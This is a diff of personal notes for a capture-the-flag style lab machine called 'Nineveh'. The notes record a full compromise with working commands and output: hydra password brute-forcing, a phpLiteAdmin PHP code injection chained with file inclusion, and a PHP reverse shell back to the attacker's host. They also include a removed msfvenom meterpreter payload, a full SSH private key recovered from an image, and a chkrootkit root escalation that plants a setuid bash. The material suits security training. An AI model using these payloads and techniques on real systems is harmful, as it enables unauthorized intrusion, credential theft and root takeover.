@@ -7,38 +7,327 @@ https://10.10.10.43:443/secure_notes
 http://10.10.10.43/department
 
 
-we hydra into the db login
+we hydra into the db login, there is no username
 
 hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 50 -V
 
 [443][http-post-form] host: 10.10.10.43   login: none   password: password123
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-25 22:08:27
+
+
+inside we find phpLiteAdmin v1.9
+
+┌──(root㉿kali)-[/home/kali]
+└─# searchsploit phpLiteAdmin    
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+phpLiteAdmin - 'table' SQL Injection                                               | php/webapps/38228.txt
+phpLiteAdmin 1.1 - Multiple Vulnerabilities                                        | php/webapps/37515.txt
+PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                     | php/webapps/24044.txt
+phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                      | php/webapps/39714.txt
+
+https://www.exploit-db.com/exploits/24044
+
+"phpliteadmin.php#1785: 'When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.',
+
+An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.
+
+Proof of Concept:
+
+1. We create a db named "hack.php".
+(Depending on Server configuration sometimes it will not work and the name for the db will be "hack.sqlite". Then simply try to rename the database / existing database to "hack.php".)
+The script will store the sqlite database in the same directory as phpliteadmin.php.
+
+2. Now create a new table in this database and insert a text field with the default value:
+<?php phpinfo()?>
+
+"
+
+Path to database: /var/tmp/test
+
+however, we do not see this db reflected anywhere on the site yet.
+
                                                                                                                      
 ┌──(root㉿kali)-[/home/kali]
 └─# 
 
-and for the department login
+and for the department login, we are able to do the same due to username error message enumeration
+which assists us in finding that admin is a valid user
 
 [80][http-post-form] host: 10.10.10.43   login: none   password: 1q2w3e4r5t
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-25 22:23:09
 
 
+logging in there is not much.
+
+http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt
+
+LFI, but there is some check whereas only a file containing "ninevehNotes.txt" will take
+
+
+
+
+we make the datbase named ninevehNotes.txt.writeup.php with a table containing a text row with the following payload
+
+<?php
+$ip = '10.10.14.38';
+$port = 53;
+$sock = fsockopen($ip, $port);
+$proc = proc_open('/bin/bash -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
+?>
+
+
+navigate to http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.txt.writeup.php
+
 
 ┌──(root㉿kali)-[/home/kali]
-└─# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=5555 -f raw > ninevehNotes.txt.writeup.php
-[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
-[-] No arch selected, selecting arch: php from the payload
-No encoder specified, outputting raw payload
-Payload size: 1112 bytes
+└─# nc -lnvp 53
+listening on [any] 53 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.10.10.43] 56990
+bash: cannot set terminal process group (1430): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@nineveh:/var/www/html/department$ 
 
+
+
+on secure_notes found earlier, we run strings on the image displayed and find
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
+H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
+PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
+FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
+3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
+X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
+KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
+FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
+GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
+JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
+9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
+Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
+ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
+1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
+vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
+DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
+P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
+fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
+tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
+iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
+MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
+PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
+i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
+il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
+fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
+-----END RSA PRIVATE KEY-----
+secret/nineveh.pub
+0000644
+0000041
+0000041
+00000000620
+13126060277
+014541
+ustar  
+www-data
+www-data
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
                                                                                                                      
 ┌──(root㉿kali)-[/home/kali]
-└─# cat ninevehNotes.txt.writeup.php 
-/*<?php /**/ error_reporting(0); $ip = '10.10.14.16'; $port = 5555; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();  
 
 
+
+there is no ssh displayed, so we suspect port knocking, we could also find this in the mail
+
+www-data@nineveh:/var/mail$ cat amrois
+From root@nineveh.htb  Fri Jun 23 14:04:19 2017
+Return-Path: <root@nineveh.htb>
+X-Original-To: amrois
+Delivered-To: amrois@nineveh.htb
+Received: by nineveh.htb (Postfix, from userid 1000)
+        id D289B2E3587; Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
+To: amrois@nineveh.htb
+From: root@nineveh.htb
+Subject: Another Important note!
+Message-Id: <20170623190419.D289B2E3587@nineveh.htb>
+Date: Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
+
+Amrois! please knock the door next time! 571 290 911
+
+
+
+www-data@nineveh:/var/mail$ 
+
+
+www-data@nineveh:/home/amrois$ cat /etc/knockd.conf 
+[options]
+ logfile = /var/log/knockd.log
+ interface = ens160
+
+[openSSH]
+ sequence = 571, 290, 911 
+ seq_timeout = 5
+ start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+ tcpflags = syn
+
+[closeSSH]
+ sequence = 911,290,571
+ seq_timeout = 5
+ start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+ tcpflags = syn
+www-data@nineveh:/home/amrois$
+
+https://sirensecurity.io/blog/port-knocking/
+
+tried all sorts of arrangements and couldnt this working externally. 
+
+so i used ssh inside the box... ?
+
+
+www-data@nineveh:/var/tmp$ ssh -i amrois amrois@localhost
+Could not create directory '/var/www/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
+Ubuntu 16.04.2 LTS
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+287 packages can be updated.
+206 updates are security updates.
+
+
+You have mail.
+Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
+amrois@nineveh:~$ 
+
+
+
+linEnum, or looking for files we own, will find 
+
+
+amrois@nineveh:~$ find / -type f -user $(whoami) 2>/dev/null
+/home/amrois/.bash_logout
+/home/amrois/.bashrc
+/home/amrois/.cache/motd.legal-displayed
+/home/amrois/.profile
+/home/amrois/.ssh/authorized_keys
+/home/amrois/user.txt
+...
+/report/report-25-12-11:09:56.txt
+/report/report-25-12-11:09:59.txt
+/report/report-25-12-11:09:57.txt
+/report/report-25-12-11:09:54.txt
+/report/report-25-12-11:09:51.txt
+/report/report-25-12-11:09:58.txt
+/report/report-25-12-11:09:55.txt
+/report/report-25-12-11:09:50.txt
+/report/report-25-12-11:09:52.txt
+/report/report-25-12-11:09:53.txt
+/usr/sbin/report-reset.sh
+
+
+
+amrois@nineveh:/report$ ls -lsa /usr/sbin/report-reset.sh 
+4 -rwxr-x--- 1 amrois amrois 34 Jul  2  2017 /usr/sbin/report-reset.sh
+
+
+amrois@nineveh:/report$ cat /usr/sbin/report-reset.sh
+#!/bin/bash
+
+rm -rf /report/*.txt
+amrois@nineveh:/report$ 
+
+
+amrois@nineveh:/report$ cat report-25-12-11\:10\:00.txt
+ROOTDIR is `/'
+Checking `amd'... not found
+Checking `basename'... not infected
+Checking `biff'... not found
+Checking `chfn'... not infected
+Checking `chsh'... not infected
+Checking `cron'... not infected
+Checking `crontab'... not infected
+Checking `date'... not infected
+Checking `du'... not infected
+...
+Checking `slapper'... not infected
+
+
+googling finds this is behavior of Chkrootkit
+
+
+
+https://www.exploit-db.com/exploits/33899
+
+"We just found a serious vulnerability in the chkrootkit package, which
+may allow local attackers to gain root access to a box in certain
+configurations (/tmp not mounted noexec).
+
+The vulnerability is located in the function slapper() in the
+shellscript chkrootkit:
+
+...
+
+The line 'file_port=$file_port $i' will execute all files specified in
+$SLAPPER_FILES as the user chkrootkit is running (usually root), if
+$file_port is empty, because of missing quotation marks around the
+variable assignment.
+
+Steps to reproduce:
+
+- Put an executable file named 'update' with non-root owner in /tmp (not
+mounted noexec, obviously)
+- Run chkrootkit (as uid 0)
+
+Result: The file /tmp/update will be executed as root, thus effectively
+rooting your box, if malicious content is placed inside the file.
+
+If an attacker knows you are periodically running chkrootkit (like in
+cron.daily) and has write access to /tmp (not mounted noexec), he may
+easily take advantage of this.
+
+
+Suggested fix: Put quotation marks around the assignment.
+
+file_port="$file_port $i"
+
+
+I will also try to contact upstream, although the latest version of
+chkrootkit dates back to 2009 - will have to see, if I reach a dev there."
+
+
+
+there is currently no /tmp/update file so we create one containing
+
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+
+
+
+amrois@nineveh:/tmp$ ls -lsa
+total 1056
+   4 drwxrwxrwt  9 root   root      4096 Dec 11 10:12 .
+   4 drwxr-xr-x 24 root   root      4096 Jul  2  2017 ..
+   4 drwxrwxrwt  2 root   root      4096 Dec 11 09:27 .font-unix
+   4 drwxrwxrwt  2 root   root      4096 Dec 11 09:27 .ICE-unix
+1016 -rwsr-sr-x  1 root   root   1037528 Dec 11 10:12 rootbash
+   4 drwx------  3 root   root      4096 Dec 11 09:27 systemd-private-b9df2f89e54242f88c6b060f65c7ccec-systemd-timesyncd.service-q8WosI
+   4 drwxrwxrwt  2 root   root      4096 Dec 11 09:27 .Test-unix
+   4 -rwxrwxr-x  1 amrois amrois      62 Dec 11 10:11 update
+   4 drwx------  2 root   root      4096 Dec 11 09:28 vmware-root
+   4 drwxrwxrwt  2 root   root      4096 Dec 11 09:27 .X11-unix
+   4 drwxrwxrwt  2 root   root      4096 Dec 11 09:27 .XIM-unix
+amrois@nineveh:/tmp$ ./rootbash -p
+rootbash-4.3# id
+uid=1000(amrois) gid=1000(amrois) euid=0(root) egid=0(root) groups=0(root),1000(amrois)
+rootbash-4.3# 
 
 
 
